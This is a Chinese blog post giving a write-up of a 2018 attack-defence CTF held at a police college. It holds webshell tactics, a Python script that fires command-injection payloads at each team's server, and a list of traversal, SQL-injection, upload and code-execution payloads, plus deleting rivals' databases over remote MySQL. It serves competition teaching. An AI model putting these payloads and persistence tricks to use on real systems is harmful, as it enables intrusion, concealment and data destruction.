@@ -1,0 +1,478 @@
+<!DOCTYPE html>
+
+
+  <html class="light page-post">
+
+
+<head>
+  <meta charset="utf-8">
+  
+  <title>6月9新警-易霖博杯网络安全技能大赛 | xjseck&#39;s Home</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="CTF,攻防竞赛," />
+  
+
+  <meta name="description" content="描述  这次比赛从最初的想法提出应该是从5月初，警察学院的曹兄和我聊的时候，就想为上学期间交一份不枉此行的答卷，也为自己后续的学弟学妹们开阔一下学习交流的空间。本想是做一个内部交流的友谊赛，但是后面的决策，都是一些大佬说的算，最后也就是促成6月9号最终的比赛形式了，后面有机会还是想搞一个比较传统的CTF比赛，从线上到线下，自主命题线上和线下题目。CTF和Web渗透测试也算是玩的比较久的，现成的题目">
+<meta name="keywords" content="CTF,攻防竞赛">
+<meta property="og:type" content="article">
+<meta property="og:title" content="6月9新警-易霖博杯网络安全技能大赛">
+<meta property="og:url" content="https://www.xjseck.com/2018/06/11/6月9新警-易霖博杯网络安全技能大赛/index.html">
+<meta property="og:site_name" content="xjseck&#39;s Home">
+<meta property="og:description" content="描述  这次比赛从最初的想法提出应该是从5月初，警察学院的曹兄和我聊的时候，就想为上学期间交一份不枉此行的答卷，也为自己后续的学弟学妹们开阔一下学习交流的空间。本想是做一个内部交流的友谊赛，但是后面的决策，都是一些大佬说的算，最后也就是促成6月9号最终的比赛形式了，后面有机会还是想搞一个比较传统的CTF比赛，从线上到线下，自主命题线上和线下题目。CTF和Web渗透测试也算是玩的比较久的，现成的题目">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://www.xjseck.com/2018/06/11/6月9新警-易霖博杯网络安全技能大赛/ctfwp.png">
+<meta property="og:image" content="https://www.xjseck.com/2018/06/11/6月9新警-易霖博杯网络安全技能大赛/6.png">
+<meta property="og:image" content="https://www.xjseck.com/2018/06/11/6月9新警-易霖博杯网络安全技能大赛/66.png">
+<meta property="og:image" content="https://www.xjseck.com/2018/06/11/6月9新警-易霖博杯网络安全技能大赛/web1.png">
+<meta property="og:image" content="https://www.xjseck.com/2018/06/11/6月9新警-易霖博杯网络安全技能大赛/web2.png">
+<meta property="og:image" content="https://www.xjseck.com/2018/06/11/6月9新警-易霖博杯网络安全技能大赛/web11.png">
+<meta property="og:image" content="https://www.xjseck.com/2018/06/11/6月9新警-易霖博杯网络安全技能大赛/web222.png">
+<meta property="og:image" content="https://www.xjseck.com/2018/06/11/6月9新警-易霖博杯网络安全技能大赛/web3.png">
+<meta property="og:image" content="https://www.xjseck.com/2018/06/11/6月9新警-易霖博杯网络安全技能大赛/web4.png">
+<meta property="og:updated_time" content="2018-06-14T12:27:26.501Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="6月9新警-易霖博杯网络安全技能大赛">
+<meta name="twitter:description" content="描述  这次比赛从最初的想法提出应该是从5月初，警察学院的曹兄和我聊的时候，就想为上学期间交一份不枉此行的答卷，也为自己后续的学弟学妹们开阔一下学习交流的空间。本想是做一个内部交流的友谊赛，但是后面的决策，都是一些大佬说的算，最后也就是促成6月9号最终的比赛形式了，后面有机会还是想搞一个比较传统的CTF比赛，从线上到线下，自主命题线上和线下题目。CTF和Web渗透测试也算是玩的比较久的，现成的题目">
+<meta name="twitter:image" content="https://www.xjseck.com/2018/06/11/6月9新警-易霖博杯网络安全技能大赛/ctfwp.png">
+
+  
+
+  
+    <link rel="icon" href="/favicon.ico">
+  
+
+  <link href="/css/styles.css?v=c114cbe6" rel="stylesheet">
+
+
+  
+    <link rel="stylesheet" href="/css/personal-style.css">
+  
+
+  
+
+  
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?57e94d016e201fba3603a8a2b0263af0";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+  
+  <script type="text/javascript">
+	(function(){
+	    var bp = document.createElement('script');
+	    var curProtocol = window.location.protocol.split(':')[0];
+	    if (curProtocol === 'https') {
+	        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+	    }
+	    else {
+	        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+	    }
+	    var s = document.getElementsByTagName("script")[0];
+	    s.parentNode.insertBefore(bp, s);
+	})();
+  </script>
+
+
+
+  
+    <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  
+
+  
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
+  
+</head>
+
+<body>
+
+
+  
+    <span id="toolbox-mobile" class="toolbox-mobile">导航</span>
+  
+
+  <div class="post-header CENTER">
+   
+  <div class="toolbox">
+    <a class="toolbox-entry" href="/">
+      <span class="toolbox-entry-text">导航</span>
+      <i class="icon-angle-down"></i>
+      <i class="icon-home"></i>
+    </a>
+    <ul class="list-toolbox">
+      
+        <li class="item-toolbox">
+          <a
+            class="ROUND_RECT"
+            href="/archives/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            博客
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="ROUND_RECT"
+            href="/category/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            分类
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="ROUND_RECT"
+            href="/tag/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            标签
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="ROUND_RECT"
+            href="/link/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            友链
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="ROUND_RECT"
+            href="/about/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            关于
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+
+
+</div>
+
+
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#描述"><span class="toc-text">描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#题目wp"><span class="toc-text">题目wp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#防护"><span class="toc-text">防护</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#花絮"><span class="toc-text">花絮</span></a></li></ol>
+  </div>
+
+
+
+<div class="content content-post CENTER">
+   <article id="post-6月9新警-易霖博杯网络安全技能大赛" class="article article-type-post" itemprop="blogPost">
+  <header class="article-header">
+    <h1 class="post-title">6月9新警-易霖博杯网络安全技能大赛</h1>
+
+    <div class="article-meta">
+      <span>
+        <i class="icon-calendar"></i>
+        <span>2018.06.11</span>
+      </span>
+
+      
+        <span class="article-author">
+          <i class="icon-user"></i>
+          <span>xjseck</span>
+        </span>
+      
+
+      
+  <span class="article-category">
+    <i class="icon-list"></i>
+    <a class="article-category-link" href="/categories/CTF/">CTF</a>
+  </span>
+
+
+
+      
+
+      
+      <i class="fa fa-eye"></i> 
+        <span id="busuanzi_container_page_pv">
+           &nbsp热度 <span id="busuanzi_value_page_pv">
+           <i class="fa fa-spinner fa-spin"></i></span>℃
+        </span>
+      
+
+      
+        <i class="icon-comment"></i> 
+        <span class="ds-thread-count" data-thread-key="post-6月9新警-易霖博杯网络安全技能大赛"><i class="fa fa-spinner fa-spin"></i></span> 条评论
+      
+      
+    </div>
+  </header>
+
+  <div class="article-content">
+    
+      <h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>  这次比赛从最初的想法提出应该是从5月初，警察学院的曹兄和我聊的时候，就想为上学期间交一份不枉此<br>行的答卷，也为自己后续的学弟学妹们开阔一下学习交流的空间。本想是做一个内部交流的友谊赛，但是后面的决策，都是一些大佬说的算，最后也就是促成6月9号最终的比赛形式了，后面有机会还是想搞一个比较传统的CTF比赛，从线上到线下，自主命题线上和线下题目。CTF和Web渗透测试也算是玩的比较久的，现成的题目也积累了相对比较多，这一方面有感兴趣的小伙伴可以私下交流一下，具体的题目资源和本学校的信息安全协会都会有相应的介绍，关于CTF比赛WEB解题的模式，可以参考github上面的内容 <a href="https://github.com/Huseck/CTF" target="_blank" rel="noopener">github</a>最后贴上几个图片吧。</p>
+<p><img src="ctfwp.png" alt="图片描述"><br><img src="6.png" alt="图片描述"><br><img src="66.png" alt="图片描述"></p>
+<h2 id="题目wp"><a href="#题目wp" class="headerlink" title="题目wp"></a>题目wp</h2><ol>
+<li>首先拿到题目，就比较懵逼，这比赛的感觉就不吐槽了，上来就是web版的ssh 才可以使用，只能一个人进行操作。</li>
+<li>两个Web服务器，配搭着各种服务和漏洞。server1  root用户，web目录文件也是root，所以这个很蛇皮。Server2 admin用户，Web 目录文件也是admin组，这个还可以，文件权限都是777。</li>
+<li>根据以往比赛经验来看，大致的思路我这里贴一下，后面再介绍此次比赛所用到的姿势。</li>
+</ol>
+<blockquote>
+<p>1、备份。源码以及数据库，可以备份到隐蔽的目录（.xx）下，顺便down到本地（Win下：Winscp，FileZilla；Mac：scp，Transmit..）；<br>2、扫描后门。有的比赛主办方留有后门，利用安全狗、D盾这类软件来扫描源码，快速定位并利用；或者利用seay的代码审计工具也可快速扫描到后门；<br>3、弱口令。绝大多数情况下，所有队伍的Web后台、phpmyadmin等服务的管理密码都一样，快速修改自己密码（无关紧要的可直接mv来改名）并利用；<br>4、自写敏感功能。主办方可能已经把CMS本身的漏洞补全了，并自写了一些敏感功能，如上传、包含界面..，这时候需要自己手动去发现（利用seay代码审计工具可快速定位、ls -t按修改时间来看最新被修改的文件），分析，删除，利用；<br>5、监测文件上传时间可快速发现他人shell，并加以利用。我们上传的shell也可以修改文件时间来加强混淆，touch -r 目的 源；<br>6、不要想办法提权，费时费力不讨好，给root的主办方都是假的；<br>7、开一台ssh只做一件事，tail -f *.log，看日志，不言而喻，抓他们的payload并利用；<br>8、CMS补漏洞没必要按着网上的一步一步修改源码来改，如果是一些无关紧要的功能，直接mv改名，大多数主办方只是check服务是否能正常运行；<br>9、shell使用外部接受参数进行命令调用，多POST；<br>10、权限维持很多方法，如果被种上都很恶心，不过如果挂上waf（禁止文件上传，执行任何命令均返回假flag，发现敏感字段直接exit [过滤都是假的]，…）这些都是浮云，手速还是最重要的；<br>11、为了避免自己上传的shell都一样而被别人利用于其他服务器，可以采用md5等hash来命名文件名（避免，太扎眼）或者密码；<br>12、如果被挂上内存马，并且没有权限来restart apache2下，完全可以直接在shell中（www-data 权限）下 kill -9 -1   杀死所有子进程（杀死当前用户所有进程，有权限下慎用），也可以直接killall apache2。这种操作并不会kill掉apache主进程，因为内存马是Apache启动的一个子进程；<br>13、同12，要注意守护进程的文件，这个才是最恶心的；<br>线下赛最重要的是文件、流量的监控和自身修补的防御，一人兼职边防边打往往会失去好多分  </p>
+</blockquote>
+<ol start="4">
+<li>这次题目的分析</li>
+</ol>
+<p><strong>这里多说一句，涉及的工具和资源文件，可以参考我博客(xjseck.com)上的文章 和github上的资源文件</strong></p>
+<p>一、 上来备份文件，Web版的ssh，所以这里我直接给我的web都植入了一个一句话后门，使用<br><code>#tar -cvf /tmp/web1.rar /var/www/html</code> ，然后使用菜刀进行下载就好了<br>二、 进行D盾或者我github上写好的scanshell.py 进行后门的扫描<br>web1的扫描结果<br><img src="web1.png" alt="scanshell"><br>web2的扫描结果<br><img src="web2.png" alt="scanshell"><br>到这里的时候，队友就可以补上了，我们就很快速的写好了一个简单的批量脚本了，首轮就开始了进行手动提交flag了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># coding:utf-8</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">flag = []</span><br><span class="line">ip = [1, 2, 3, 5, 6, 7, 8]</span><br><span class="line"># 105</span><br><span class="line">for i in ip:</span><br><span class="line">    try:</span><br><span class="line">        url = &quot;http://172.20.10&quot; + str(i) + &quot;.101&quot; + &quot;/index.php&quot;</span><br><span class="line">        print url</span><br><span class="line">        post = &#123;&apos;aa&apos;: &apos;system(\&quot;cat /flaginfo.txt\&quot;);&apos;&#125;</span><br><span class="line">        a = requests.post(url, data=post, timeout=2)</span><br><span class="line">        if a.status_code == 200:</span><br><span class="line">            print a.text[:32]</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br></pre></td></tr></table></figure>
+<p>其他的shell类推一下，只要针对能取得所有的队伍flag就ok了，因为flag刷新也就那么几轮，所以也就没有写自动化提交flag的脚本了。大多数时间，是在看神仙们打架。</p>
+<p>三、 队友手动上的waf文件的时候少写了一个字母导致，丢失了20分，后面大家的访问日志就正常保存了。</p>
+<p>四、 <strong>题目漏洞汇总</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">工具扫描的shell是几个问题。</span><br><span class="line">分析源代码的漏洞大致有一下几点，都是手动构造的漏洞。</span><br><span class="line">1. web1/about.php?f=../../../../../../../../../../../flaginfo.txt</span><br><span class="line">2. web1/reg.php?a=system(&apos;cat /flaginfo.txt&apos;);</span><br><span class="line">3. web1/index.php?123=system(&apos;cat /flaginfo.txt&apos;);</span><br><span class="line">4. web1/message.php?id=1 union select 1,2,group_concat(user_name),4 from users--+  注入后台用户名，mysql5.7  不能读文件好气。进入后台,user.php</span><br><span class="line">&lt;?php system(&quot;cat /root/flag.txt&quot;);?&gt;</span><br><span class="line">其实主办方的意思是，登录后台就能显示flag内容的，但是flag文件确实flaginfo.txt,就问你是蛇皮的吧。</span><br><span class="line">5. 最后阶段的时候丢了40分，突然就明白过来，不仅限于web服务，后面发现vsftp服务，直接允许匿名用户登录，映射的目录是根目录，直接可以刷一波 ftp://172.20.108.101/flaginfo.txt</span><br><span class="line">6. web1  mysql 可以进行远程登录 mysql -h -uroot -p123 进行任意队伍的web1数据库的ctf删除掉，迫使主办方进行重置，刷分。</span><br><span class="line">7. web1 后台的任意文件上传 POST /user/upload.php </span><br><span class="line">images/1528712524shell.php 访问web1/images/1528712524.php </span><br><span class="line">8. web2/index.php?aa=system(&apos;cat /flaginfo.txt&apos;);</span><br><span class="line">9. web2/footer.php   POST shell=cat /flaginfo.txt</span><br><span class="line">10. web2/config.php?c=system(&apos;cat /flaginfo.txt&apos;);</span><br><span class="line">11. web2/.a.php?c=system(&apos;cat /flaginfo.txt&apos;);</span><br><span class="line">12. web2/a.php?c=system(&apos;cat /flaginfo.txt&apos;);</span><br><span class="line">13. search.php?id=1  SQLMAP 跑后台密码，登录出flag 但是 又蛇皮</span><br><span class="line">14. 登录后有任意文件上传 </span><br><span class="line">web2 的详细wp可以参考主办方提供的wp，上传到了github上了。</span><br></pre></td></tr></table></figure>
+<h2 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h2><p>  从上面的思路就可以知道，只要你发现了问题，才能比较好的进行修补，这次的比赛，也就是没有check文件，进行后台动态监控，选手的操作，主办方都不知道，哈哈哈，很蛇皮的吧。要是正常一点的话，就是web服务器一旦文件丢失或者web服务器不能访问，都会被扣分。网站的文件不多，都是能一眼可以看出问题的，手工都可以删改的吧。可能有队伍发现了，我们队伍使用的waf，哈哈，贴几个waf 防护的图片。<br><img src="web11.png" alt="waf"><br><img src="web222.png" alt="waf"></p>
+<h2 id="花絮"><a href="#花絮" class="headerlink" title="花絮"></a>花絮</h2><p>  这次的比赛没有使用写好的专门的脚本，进行批量植入内存马，主要是给了root权限，和满地的shell，也就没有必要了。希望后面赛事的提高再使用吧。后面分析日志文件，发现有的队伍竟然使用web目录扫描工具，我就觉的很蛇皮，明明大家的都一样，为毛使用扫描工具呢，日志量还不是一般的大，发现是108,107,103的队伍进行扫描的，只能说大佬们的套路多:)师傅们不要打我！早知道写一个策略好了，哈哈。<br><strong>最后感谢大象安全公司，为我们此次的比赛保驾护航！</strong></p>
+<p>  <img src="web3.png" alt="waf"><br>  <img src="web4.png" alt="waf"></p>
+
+    
+  </div>
+</article>
+
+
+   
+  <div class="text-center donation">
+    <div class="inner-donation">
+      <span class="btn-donation">支持一下</span>
+      <div class="donation-body">
+        <div class="tip text-center">扫一扫，支持作者</div>
+        <ul class="theme.donation.items.length">
+        
+          <li class="item">
+            <img src="/images/qr-wechat.png" alt="">
+          </li>
+        
+        </ul>
+      </div>
+    </div>
+  </div>
+
+
+   
+  <div class="box-prev-next clearfix">
+    <a class="show pull-left" href="/2018/02/10/Django学习笔记-四/">
+        <i class="icon icon-angle-left"></i>
+    </a>
+    <a class="hide pull-right" href="/">
+        <i class="icon icon-angle-right"></i>
+    </a>
+  </div>
+
+
+
+
+</div>
+
+
+  <a id="backTop" class="back-top">
+    <i class="icon-angle-up"></i>
+  </a>
+
+
+
+
+  <div class="modal" id="modal">
+  <span id="cover" class="cover hide"></span>
+  <div id="modal-dialog" class="modal-dialog hide-dialog">
+    <div class="modal-header">
+      <span id="close" class="btn-close">关闭</span>
+    </div>
+    <hr>
+    <div class="modal-body">
+      <ul class="list-toolbox">
+        
+          <li class="item-toolbox">
+            <a
+              class="ROUND_RECT"
+              href="/archives/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              博客
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="ROUND_RECT"
+              href="/category/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              分类
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="ROUND_RECT"
+              href="/tag/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              标签
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="ROUND_RECT"
+              href="/link/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              友链
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="ROUND_RECT"
+              href="/about/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              关于
+            </a>
+          </li>
+        
+      </ul>
+
+    </div>
+  </div>
+</div>
+
+
+
+  
+      <div class="fexo-comments comments-post">
+    
+
+    
+  <section class="duoshuo-comments">
+    <!-- 多说评论框 start -->
+    <div class="ds-thread" data-thread-key="post-6月9新警-易霖博杯网络安全技能大赛" 
+      data-title="6月9新警-易霖博杯网络安全技能大赛" data-url="https://www.xjseck.com/2018/06/11/6月9新警-易霖博杯网络安全技能大赛/index.html"></div>
+    <!-- 多说评论框 end -->
+  </section>
+
+
+
+
+  <script type="text/javascript">
+  var duoshuoQuery = {short_name:"forsigner"};
+  (function() {
+    var ds = document.createElement('script');
+    ds.type = 'text/javascript';ds.async = true;
+    ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+    ds.charset = 'UTF-8';
+    (document.getElementsByTagName('head')[0]
+     || document.getElementsByTagName('body')[0]).appendChild(ds);
+  })();
+  </script>
+
+
+    
+  <div id="cloud-tie-wrapper" class="cloud-tie-wrapper"></div>
+<script>
+  var cloudTieConfig = {
+    url: document.location.href, 
+    sourceId: "",
+    productKey: "d16a7241e7cd4b389584ed8db2a4e8bc",
+    target: "cloud-tie-wrapper"
+  };
+</script>
+<script src="https://img1.ws.126.net/f2e/tie/yun/sdk/loader.js"></script>
+
+
+    
+
+	<hr />
+	<div id="hypercomments_widget"></div>
+	<script type="text/javascript">
+	_hcwp = window._hcwp || [];
+
+	_hcwp.push({widget:"Stream", widget_id: '89821'});
+
+	(function() {
+
+	if("HC_LOAD_INIT" in window) return;
+
+	HC_LOAD_INIT = true;
+
+	var lang = (navigator.language || navigator.systemLanguage || navigator.userLanguage || "en").substr(0, 2).toLowerCase();
+
+	var hcc = document.createElement("script"); 
+	hcc.type = "text/javascript"; 
+	hcc.async = true;
+	hcc.src = ("https:" == document.location.protocol ? "https" : "http")+"://w.hypercomments.com/widget/hc/"+'89821' +"/"+lang+"/widget.js";
+
+	var s = document.getElementsByTagName("script")[0];
+	s.parentNode.insertBefore(hcc, s.nextSibling);
+	})();
+
+	</script>
+
+	<a href="http://hypercomments.com" class="hc-link" title="comments widget">Powered by HyperComments</a>
+
+
+	
+  </div>
+
+  
+
+  <script type="text/javascript">
+  function loadScript(url, callback) {
+    var script = document.createElement('script')
+    script.type = 'text/javascript';
+
+    if (script.readyState) { //IE
+      script.onreadystatechange = function() {
+        if (script.readyState == 'loaded' ||
+          script.readyState == 'complete') {
+          script.onreadystatechange = null;
+          callback();
+        }
+      };
+    } else { //Others
+      script.onload = function() {
+        callback();
+      };
+    }
+
+    script.src = url;
+    document.getElementsByTagName('head')[0].appendChild(script);
+  }
+
+  window.onload = function() {
+    loadScript('/js/bundle.js?235683', function() {
+      // load success
+    });
+  }
+</script>
+
+</body>
+</html>
